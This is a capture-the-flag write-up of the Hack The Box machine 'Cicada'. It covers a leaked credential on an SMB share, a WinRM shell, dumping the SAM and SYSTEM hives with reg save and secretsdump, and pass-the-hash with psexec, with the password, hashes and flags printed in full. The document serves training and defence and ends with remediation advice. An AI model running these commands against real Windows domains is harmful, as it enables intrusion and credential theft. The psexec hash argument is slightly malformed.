# Cicada (HTB medium)
**Box:** Cicada · **IP:** 10.10.11.35 · **Domain:** cicada.htb · **OS:** Windows Server (AD)  
**Date (lab):** 2025-10-25

---

## Executive summary
Got initial access by finding a readable dev share that contained `Backup_script.ps1` with embedded `emily.oscars` credentials. Used those creds to authenticate, got a WinRM shell as `emily.oscars`, then abused backup/VSS techniques to export SAM and SYSTEM hives. Extracted NT hashes from the hives, used them for lateral movement and psexec to get Administrator, and captured both user and root flags. This box is a textbook example of how bad share hygiene and embedded credentials escalate quickly.

- Foothold: `backup_script.ps1` on dev share with `emily.oscars` credential.  
- Escalation: Volume Shadow Copy and backup API used to dump SAM and SYSTEM; offline hash extraction.  
- Impact: full host and domain compromise; `user.txt` and `root.txt` recovered.

---

## Attack chain summary
1. Recon - nmap and SMB enumeration to locate shares and interesting files.  
2. Foothold - authenticate using credentials found in `backup_script.ps1` (emily.oscars).  
3. Host-level privilege escalation - use backup operator/VSS flows to expose protected registry hives.  
4. Offline extraction - run `secretsdump.py` against the exported hives to recover NT hashes.  
5. Lateral/admin takeover - use recovered Administrator hash to connect and grab `root.txt`.

---

## Technical breakdown (concise, copy/paste friendly)

### Recon and share discovery  
Nmap and SMB enumeration showed standard AD ports and accessible SMB shares. The `dev` share held a `Backup_script.ps1` that contained a SecureString for `emily.oscars`. Raw notes and the script are in the artifacts.

### Foothold - use of leaked credential
The script included this credential line:
```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
```
With that password I pulled the script and authenticated by SMB/WinRM, then retrieved the user flag: `25424298bec50b4bfb7274f2c4a0508e`.

Minimal commands demonstrating the flow (trimmed):
```bash
# fetch script from dev share
smbclient //10.10.11.35/dev -U 'emily.oscars%Q!3@Lp#M6b*7t*Vt' -c 'get backup_script.ps1'
# get an interactive shell
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
# once in: cat C:\Users\emily.oscars\Desktop\user.txt
```

### Escalation - backup operator / VSS abuse
The host allowed actions that let me expose C: via the backup context (VSS or diskshadow style). In short:
- create a VSS snapshot or use the backup API to alias C: as an exposed volume,  
- `reg save HKLM\SAM SAM` and `reg save HKLM\SYSTEM SYSTEM` to dump the registry hives,  
- copy the SAM and SYSTEM out over SMB to the attacker box.

Example interactive pseudo sequence used in lab:
```powershell
# create/expose volume using diskshadow/wbadmin sequence
# then on host:
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
# copy them out via smbclient or via an SMB share mapping
```
I then ran `secretsdump.py` locally against these hives:
```bash
secretsdump.py local -sam SAM -system SYSTEM
# output included Administrator with hash: 2b87e7c93a3e8a0ea4a581937016f341
```

### Admin takeover and proof
With the Administrator NT hash, used `psexec.py` (or `evil-winrm` with the hash) to get admin shell and grabbed `root.txt`:
```bash
psexec.py -hashes 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 administrator@10.10.11.35
# cat C:\Users\Administrator\Desktop\root.txt -> ee05e71219cdc062408ca47dc5358de9
```
All of the above steps are supported by the raw artifacts saved with the box.

---

## Key findings and remediation summary
- Do not store credentials in scripts; use a vault or managed identity with strict ACLs.  
- Lock down dev/IT shares; treat scripts and configs as sensitive files and restrict read ACLs to service accounts only.  
- Remove unnecessary backup operator or seBackup privileges from accounts that do not need them.  
- Monitor for VSS/reg hive exports and large or unusual SMB read patterns; alert on unexpected `reg save` or `diskshadow` usage.

---

## Evidence & artifacts
- `assets/backup_script.ps1` - contains `emily.oscars` credential used for initial access.  
- saved `SAM` and `SYSTEM` registry snapshots used for `secretsdump.py`.  
- `secretsdump.py` output showing Administrator hash.  
- `user.txt` - `25424298bec50b4bfb7274f2c4a0508e` and `root.txt` - `ee05e71219cdc062408ca47dc5358de9`.

---

## Reflection
Good example of operational hygiene failing quietly; the backup script was a single file that unlocked everything. Clean the backups, remove embedded creds, and tighten share access and the box becomes trivial to defend.

---

## Cleaned PoC - `backup_script.ps1`
```powershell
# source and destination
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

# Credentials
$username = "emily.oscars"
$passwordPlain = "Q!3@Lp#M6b*7t*Vt"
$password = ConvertTo-SecureString $passwordPlain -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)

# safety: ensure destination exists, create if missing (non-destructive)
if (-Not (Test-Path -Path $destinationDirectory)) {
    Write-Host "Destination does not exist; creating $destinationDirectory for demo"
    New-Item -ItemType Directory -Path $destinationDirectory | Out-Null
}

# timestamp for the backup file
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName

# compress
try {
    Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath -Force
    Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
} catch {
    Write-Host "Backup step failed; check paths and permissions. Exception: $_"
}
```

